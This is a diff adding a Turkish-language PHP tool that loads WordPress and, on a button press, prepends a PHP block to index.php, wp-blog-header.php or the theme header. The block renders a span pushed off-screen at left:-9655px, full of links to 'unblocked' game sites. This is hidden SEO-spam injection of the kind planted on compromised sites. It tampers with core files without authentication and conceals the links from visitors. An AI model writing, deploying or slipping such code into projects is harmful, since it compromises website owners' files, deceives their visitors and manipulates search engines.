@@ -1,0 +1,122 @@
+<?php
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+echo "Şu anki çalışma dizini: " . getcwd() . "\n";
+
+function findWpLoad($startDir) {
+    $dir = $startDir;
+    while ($dir !== '/') {
+        if (file_exists($dir . '/wp-load.php')) {
+            return $dir . '/wp-load.php';
+        }
+        $dir = dirname($dir);
+    }
+    return false;
+}
+
+$wpLoadPath = findWpLoad(__DIR__);
+
+if ($wpLoadPath) {
+    echo "wp-load.php bulundu: " . $wpLoadPath . "\n";
+    require_once($wpLoadPath);
+} else {
+    die("WordPress yüklenemedi.");
+}
+
+$currentTheme = wp_get_theme();
+$themeDir = get_template_directory();
+
+echo "Mevcut tema: " . $currentTheme->get('Name') . "\n";
+echo "Tema dizini: " . $themeDir . "\n";
+
+function addBacklink($filePath, $backlinkCode) {
+    if (!file_exists($filePath) || !is_readable($filePath) || !is_writable($filePath)) {
+        throw new Exception("Dosyaya erişilemiyor veya düzenlenemiyor: $filePath");
+    }
+
+    $fileContents = file_get_contents($filePath);
+    
+    if ($fileContents === false) {
+        throw new Exception("Dosya okunamadı: $filePath");
+    }
+
+    if (strpos($fileContents, $backlinkCode) !== false) {
+        return "Backlink zaten mevcut: $filePath";
+    }
+
+    // Backlink kodunu dosyanın en başına ekle
+    $newContents = $backlinkCode . "\n" . $fileContents;
+    
+    if (file_put_contents($filePath, $newContents) === false) {
+        throw new Exception("Dosyaya yazma hatası: $filePath");
+    }
+    
+    return "Backlink başarıyla eklendi: $filePath";
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    ob_start();
+
+    $backlinkCode = "<?php
+echo '<span style=\"position: absolute; left: -9655px;\">
+<a href="https://www.symbaloo.com/mix/paperiounblocked2?lang=EN" title="https://www.symbaloo.com/mix/paperiounblocked2?lang=EN">https://www.symbaloo.com/mix/paperiounblocked2?lang=EN</a>
+<a href="https://www.symbaloo.com/mix/yohoho?lang=EN" title="yohoho">yohoho</a>
+<a href="https://www.symbaloo.com/mix/agariounblockedschool1?lang=EN" title="https://www.symbaloo.com/mix/agariounblockedschool1?lang=EN">https://www.symbaloo.com/mix/agariounblockedschool1?lang=EN</a>
+<a href="https://yohoho-io.app/" title="yohoho-io.app/">yohoho-io.app/</a>
+<a href="https://2.yohoho-io.net/" title="https://2.yohoho-io.net/">https://2.yohoho-io.net/</a>
+<a href="https://www.symbaloo.com/mix/io-unblocked" title="paper.io unblocked">paper.io unblocked</a>
+<a href="https://www.symbaloo.com/mix/yohoho-unblocked-76?lang=EN" title="https://www.symbaloo.com/mix/yohoho-unblocked-76?lang=EN">https://www.symbaloo.com/mix/yohoho-unblocked-76?lang=EN</a>
+<a href="https://www.symbaloo.com/mix/agariounblockedpvp" title="https://www.symbaloo.com/mix/agariounblockedpvp">https://www.symbaloo.com/mix/agariounblockedpvp</a>
+<a href="https://www.symbaloo.com/mix/agariounblockedschool?lang=EN" title="https://www.symbaloo.com/mix/agariounblockedschool?lang=EN">https://www.symbaloo.com/mix/agariounblockedschool?lang=EN</a>
+<a href="https://www.symbaloo.com/mix/google-sites-unblocked?lang=EN" title="https://www.symbaloo.com/mix/google-sites-unblocked?lang=EN">https://www.symbaloo.com/mix/google-sites-unblocked?lang=EN</a>
+</span>';
+?>";
+
+    $wpDir = dirname($wpLoadPath);
+    $filesToTry = [
+        $wpDir . '/index.php',
+        $wpDir . '/wp-blog-header.php',
+        $themeDir . '/header.php'
+    ];
+
+    $success = false;
+
+    foreach ($filesToTry as $filePath) {
+        echo "Deneniyor: $filePath\n";
+        try {
+            $result = addBacklink($filePath, $backlinkCode);
+            echo $result . "\n";
+            $success = true;
+            break;
+        } catch (Exception $e) {
+            echo "Başarısız: " . $e->getMessage() . "\n";
+        }
+    }
+
+    if (!$success) {
+        echo "Hiçbir dosyaya backlink eklenemedi.\n";
+    }
+
+    $output = ob_get_clean();
+}
+?>
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>WordPress Doğrudan PHP Backlink Ekleme</title>
+</head>
+<body>
+    <h1>WordPress Doğrudan PHP Backlink Ekleme Aracı</h1>
+    <form method="post">
+        <button type="submit">Backlink Ekle</button>
+    </form>
+    <?php if (isset($output)): ?>
+        <h2>İşlem Sonucu:</h2>
+        <pre><?php echo htmlspecialchars($output); ?></pre>
+    <?php endif; ?>
+</body>
+buradayim
+</html>
